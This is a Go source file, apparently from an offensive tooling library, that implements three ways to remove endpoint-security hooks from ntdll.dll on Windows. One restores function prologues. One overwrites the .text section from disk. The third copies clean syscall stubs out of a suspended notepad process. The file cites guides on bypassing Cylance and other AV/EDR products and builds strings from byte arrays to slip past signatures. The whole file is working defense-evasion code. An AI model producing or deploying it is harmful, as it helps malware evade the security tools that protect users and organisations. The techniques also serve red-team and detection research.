package core

/*

References:
https://github.com/RedLectroid/APIunhooker
https://www.ired.team/offensive-security/defense-evasion/bypassing-cylance-and-other-avs-edrs-by-unhooking-windows-apis

*/

import (
  "time"
  "bytes"
  "strings"
  "errors"
  "unsafe"
  "syscall"
  "io/ioutil"

  "golang.org/x/sys/windows"

  "github.com/Binject/debug/pe"
)

// This function unhooks given functions of especified dll
func ClassicUnhook(funcnames []string, dllpath string) (error) {
  kernel32 := syscall.NewLazyDLL("kernel32.dll")
  GetCurrentProcess := kernel32.NewProc("GetCurrentProcess")
  GetModuleHandle := kernel32.NewProc("GetModuleHandleW")
  GetProcAddress := kernel32.NewProc("GetProcAddress")
  WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")

  // should be full path: C:\\Windows\\System32\\ntdll.dll
  lib, _ := syscall.LoadLibrary(dllpath)
  defer syscall.FreeLibrary(lib)

  for _, f := range funcnames {
    var assembly_bytes []byte

    procAddr, _ := syscall.GetProcAddress(lib, f)

    ptr_bytes := (*[1 << 30]byte)(unsafe.Pointer(procAddr))
    funcBytes := ptr_bytes[:5:5]

    for i := 0; i < 5; i++ {
      assembly_bytes = append(assembly_bytes, funcBytes[i])
    }

    pHandle, _, _ := GetCurrentProcess.Call()

    // Convert dll name to pointer
    lib_ptr, _ := windows.UTF16PtrFromString(strings.Split(dllpath, "\\")[3])
    moduleHandle, _, _ := GetModuleHandle.Call(uintptr(unsafe.Pointer(lib_ptr)))

    func_ptr, _ := windows.UTF16PtrFromString(f)
    addr, _, _ := GetProcAddress.Call(
      moduleHandle,
      uintptr(unsafe.Pointer(func_ptr)),
    )

    // Overwrite address with original function bytes
    WriteProcessMemory.Call(
      pHandle,
      addr,
      uintptr(unsafe.Pointer(&assembly_bytes[0])),
      5,
      uintptr(0),
    )
  }

  return nil
}

func FullUnhook(dllpath string) (error) {

  ntdll := syscall.NewLazyDLL("ntdll.dll")
  ProtectVirtualMemory := ntdll.NewProc("NtProtectVirtualMemory")

  dll_f, err := ioutil.ReadFile(dllpath)
  if err != nil {
    return err
  }

  pe_f, err := pe.Open(dllpath)
  if err != nil {
    return err
  }
  defer pe_f.Close()
  
  text_section := pe_f.Section(string([]byte{'.', 't', 'e', 'x', 't'}))
  dllBytes := dll_f[text_section.Offset:text_section.Size]

  dll_load, err := windows.LoadDLL(dllpath)
  if err != nil {
    return err
  }
  
  handle := dll_load.Handle
  dllBase := uintptr(handle)
  dllOffset := uint(dllBase) + uint(text_section.VirtualAddress)
  
  var oldfartcodeperms uintptr
  regionsize := uintptr(len(dllBytes))
  handlez := uintptr(0xffffffffffffffff)

  runfunc, _, _ := ProtectVirtualMemory.Call(
    handlez,
    uintptr(unsafe.Pointer(&dllOffset)),
    uintptr(unsafe.Pointer(&regionsize)),
    syscall.PAGE_EXECUTE_READWRITE,
    uintptr(unsafe.Pointer(&oldfartcodeperms)),
  )

  for i := 0; i < len(dllBytes); i++ {
    loc := uintptr(dllOffset + uint(i))
    mem := (*[1]byte)(unsafe.Pointer(loc))
    (*mem)[0] = dllBytes[i]
  }

  runfunc, _, _ = ProtectVirtualMemory.Call(
    handlez,
    uintptr(unsafe.Pointer(&dllOffset)),
    uintptr(unsafe.Pointer(&regionsize)),
    oldfartcodeperms,
    uintptr(unsafe.Pointer(&oldfartcodeperms)),
  )

  if runfunc != 0 {
    return errors.New("an error has ocurred")
  }

  return nil
}

func PerunsUnhook() (error) {
  WriteProcessMemory := syscall.NewLazyDLL("kernel32.dll").NewProc("WriteProcessMemory")

  var si syscall.StartupInfo
  var pi syscall.ProcessInformation
  si.Cb = uint32(unsafe.Sizeof(syscall.StartupInfo{}))
  
  cmdline, err := syscall.UTF16PtrFromString("C:\\Windows\\System32\\notepad.exe")
  if err != nil {
    return err
  }

  err = syscall.CreateProcess(
    nil,
    cmdline,
    nil,
    nil,
    false,
    windows.CREATE_NEW_CONSOLE | windows.CREATE_SUSPENDED,
    nil,
    nil,
    &si,
    &pi,
  )

  if err != nil {
    return err
  }

  time.Sleep(800 * time.Millisecond)
  
  ntd, _ := inMemLoads(string([]byte{'n', 't', 'd', 'l', 'l'}))
  if (ntd == 0) {
    return errors.New("an error has ocurred while loading ntdll.dll")
  }
  addrMod := ntd

  ntHeader := (*IMAGE_NT_HEADER)(unsafe.Pointer(addrMod + uintptr((*IMAGE_DOS_HEADER)(unsafe.Pointer(addrMod)).E_lfanew)))
  if (ntHeader == nil) {
    return errors.New("an error has ocurred while getting NT header")
  }

  time.Sleep(50 * time.Millisecond)

  modSize := ntHeader.OptionalHeader.SizeOfImage
  if (modSize == 0) {
    return errors.New("an error has ocurred while getting NT header size")
  }

  cache := make([]byte, modSize)
  var lpNumberOfBytesRead uintptr

  err = windows.ReadProcessMemory(
    windows.Handle(uintptr(pi.Process)), 
    addrMod,
    &cache[0],
    uintptr(modSize),
    &lpNumberOfBytesRead,
  )

  if err != nil {
    return err
  }

  e := syscall.TerminateProcess(pi.Process, 0)
  if e != nil {
    return e
  }

  time.Sleep(50 * time.Millisecond)

  pe0, err := pe.NewFileFromMemory(bytes.NewReader(cache))
  if err != nil {
    return err
  }

  secHdr := pe0.Section(string([]byte{'.', 't', 'e', 'x', 't'}))

  startOffset := findFirstSyscallOffset(cache, int(secHdr.VirtualSize), addrMod)
  endOffset := findLastSyscallOffset(cache, int(secHdr.VirtualSize), addrMod)
  cleanSyscalls := cache[startOffset:endOffset]

  // Don't handle error as it may return false errors
  WriteProcessMemory.Call(
    uintptr(0xffffffffffffffff),
    uintptr(addrMod + uintptr(startOffset)),
    uintptr(unsafe.Pointer(&cleanSyscalls[0])),
    uintptr(len(cleanSyscalls)),
    0,
  )

  return nil
}


